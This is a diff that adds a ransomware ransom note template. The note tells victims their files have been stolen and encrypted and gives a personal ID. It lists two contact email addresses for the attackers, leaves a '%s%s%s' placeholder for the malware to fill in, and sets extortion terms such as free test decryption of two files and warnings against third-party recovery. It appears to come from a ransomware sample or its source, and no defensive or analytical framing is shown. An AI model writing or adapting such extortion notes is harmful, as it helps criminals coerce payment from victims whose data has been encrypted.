@@ -1,0 +1,14 @@
+Warning! All files have been stolen and encrypted by us using advanced encryption.
+Personal ID: D34DC0D3BADC0C0A
+
+Contact us:
+nikson@cyberfear.com
+jackNiksey@firemail.de
+
+# In subject line please write your Personal ID
+%s%s%s
+
+# What about guarantees?
+To prove that we can decrypt your files, send us two unimportant encrypted files not the database and backup. ( up to 1 MB ) and we will decrypt them for free.
++Do not delete or modify encrypted files.
++Decryption of your files with the help of third parties may cause increased price(they add their fee to our).
